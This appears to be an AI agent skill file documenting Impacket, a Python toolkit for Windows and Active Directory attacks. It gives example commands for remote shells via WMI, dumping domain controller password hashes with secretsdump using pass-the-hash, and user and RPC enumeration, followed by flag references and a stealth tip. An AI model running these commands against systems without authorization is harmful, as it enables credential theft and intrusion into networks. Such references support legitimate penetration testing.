---
name: impacket
description: A collection of Python classes for working with network protocols, primarily focused on Windows/Active Directory environments. Use for remote code execution (WMI, SMB), dumping credentials (SAM, LSA, NTDS.dit), enumerating users, and performing reconnaissance via RPC or SMB. Essential for lateral movement, privilege escalation, and Active Directory exploitation.
---

# impacket

## Overview
Impacket is a powerful collection of Python classes for crafting and decoding network packets. It provides low-level protocol support (IP, TCP, UDP) and high-level implementations for protocols like SMB, MSRPC, NTLM, and Kerberos. It is the industry standard for Active Directory exploitation and lateral movement.

## Installation (if not already installed)
Assume Impacket is already installed. If commands are missing:
```bash
sudo apt update && sudo apt install python3-impacket
```

## Common Workflows

### Remote Execution via WMI
```bash
impacket-wmiexec administrator@192.168.1.10
```
Provides a semi-interactive shell using WMI.

### Dumping Domain Hashes (DRSUAPI)
```bash
impacket-secretsdump -just-dc -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 DOMAIN/admin@192.168.1.5
```
Extracts all NTLM hashes from the Domain Controller.

### Enumerating Users via SAMR
```bash
impacket-samrdump 192.168.1.10
```
Lists users on the target system using the SAMR protocol.

### Dumping RPC Endpoints
```bash
impacket-rpcdump @192.168.1.10
```
Maps available RPC services on the target.

## Complete Command Reference

### impacket-netview
Enumerates sessions and logged-on users.
`usage: netview.py [-h] [-user USER] [-users USERS] [-target TARGET] [-targets TARGETS] [-noloop] [-delay DELAY] [-max-connections MAX_CONNECTIONS] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] identity`

| Flag | Description |
|------|-------------|
| `identity` | `[domain/]username[:password]` |
| `-user USER` | Filter output by this user |
| `-users USERS` | Input file with list of users to filter |
| `-target TARGET` | Target system to query. If omitted, runs in domain mode |
| `-targets TARGETS` | Input file with target systems |
| `-noloop` | Stop after the first probe |
| `-delay DELAY` | Seconds delay between batch probes (default 10s) |
| `-max-connections` | Max open connections (default 1000) |
| `-ts` | Adds timestamp to logging |
| `-debug` | Turn DEBUG output ON |
| `-hashes LM:NT` | NTLM hashes for authentication |
| `-no-pass` | Don't ask for password (useful for Kerberos) |
| `-k` | Use Kerberos authentication (uses KRB5CCNAME) |
| `-aesKey hex` | AES key for Kerberos (128 or 256 bits) |
| `-dc-ip ip` | IP of the Domain Controller |

---

### impacket-rpcdump
Dumps remote RPC endpoints via epmapper.
`usage: rpcdump.py [-h] [-debug] [-ts] [-target-ip ip address] [-port [destination port]] [-hashes LMHASH:NTHASH] target`

| Flag | Description |
|------|-------------|
| `target` | `[[domain/]username[:password]@]<targetName or address>` |
| `-target-ip ip` | IP of target (useful if NetBIOS name won't resolve) |
| `-port port` | Destination port for RPC Endpoint Mapper |
| `-hashes LM:NT` | NTLM hashes for authentication |

---

### impacket-samrdump
Downloads the list of users from the target system.
`usage: samrdump.py [-h] [-csv] [-ts] [-debug] [-dc-ip ip address] [-target-ip ip address] [-port [destination port]] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] target`

| Flag | Description |
|------|-------------|
| `-csv` | Turn on CSV output |
| `-port port` | Destination port to connect to SMB Server |
| `-hashes LM:NT` | NTLM hashes for authentication |
| `-k` | Use Kerberos authentication |

---

### impacket-secretsdump
Dumps secrets (SAM, LSA, NTDS) from remote or local files.
`usage: secretsdump.py [-h] [-ts] [-debug] [-system SYSTEM] [-bootkey BOOTKEY] [-security SECURITY] [-sam SAM] [-ntds NTDS] [-resumefile RESUMEFILE] [-skip-sam] [-skip-security] [-outputfile OUTPUTFILE] [-use-vss] [-rodcNo RODCNO] [-rodcKey RODCKEY] [-use-keylist] [-exec-method [{smbexec,wmiexec,mmcexec}]] [-use-remoteSSWMI] [-use-remoteSSWMI-NTDS] [-remoteSSWMI-remote-volume REMOTESSWMI_REMOTE_VOLUME] [-remoteSSWMI-local-path REMOTESSWMI_LOCAL_PATH] [-just-dc-user USERNAME] [-ldapfilter LDAPFILTER] [-just-dc] [-just-dc-ntlm] [-skip-user SKIP_USER] [-pwd-last-set] [-user-status] [-history] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address] [-target-ip ip address] target`

| Flag | Description |
|------|-------------|
| `target` | `[[domain/]username[:password]@]<targetName or address>` or `LOCAL` |
| `-system` | SYSTEM hive file to parse |
| `-sam` | SAM hive file to parse |
| `-ntds` | NTDS.DIT file to parse |
| `-resumefile` | Resume file for NTDS.DIT session dump |
| `-outputfile` | Base filename for results |
| `-use-vss` | Use NTDSUTIL VSS method instead of DRSUAPI |
| `-exec-method` | Remote exec method for VSS: `smbexec`, `wmiexec`, `mmcexec` |
| `-just-dc` | Extract only NTDS.DIT data (Hashes + Keys) |
| `-just-dc-ntlm` | Extract only NTDS.DIT data (NTLM hashes only) |
| `-just-dc-user` | Extract data for a specific user only |
| `-history` | Dump password history and LSA secrets OldVal |
| `-user-status` | Display if the user is disabled |
| `-pwd-last-set` | Shows pwdLastSet attribute |
| `-use-remoteSSWMI` | Create Shadow Snapshot via WMI and download hives |

---

### impacket-wmiexec
Executes a semi-interactive shell via WMI.
`usage: wmiexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-silentcommand] [-debug] [-codec CODEC] [-shell-type {cmd,powershell}] [-com-version MAJOR_VERSION:MINOR_VERSION] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address] [-A authfile] [-keytab KEYTAB] target [command ...]`

| Flag | Description |
|------|-------------|
| `target` | `[[domain/]username[:password]@]<targetName or address>` |
| `command` | Command to execute. If empty, launches semi-interactive shell |
| `-share` | Share for output (default `ADMIN$`) |
| `-nooutput` | Do not print output (no SMB connection created) |
| `-shell-type` | Choose `cmd` or `powershell` |
| `-codec` | Set encoding for target output (default `utf-8`) |
| `-A authfile` | smbclient-style authentication file |

## Notes
- **Stealth**: `wmiexec` is generally stealthier than `psexec` as it doesn't install a service, but it still leaves WMI event logs.
- **Hashes**: When using `-hashes`, if you only have the NT hash, use the format `LMHASH:NTHASH` where LMHASH is empty (e.g., `:31d6cfe0...`).
- **Kerberos**: Ensure your system time is synced with the Domain Controller when using `-k`.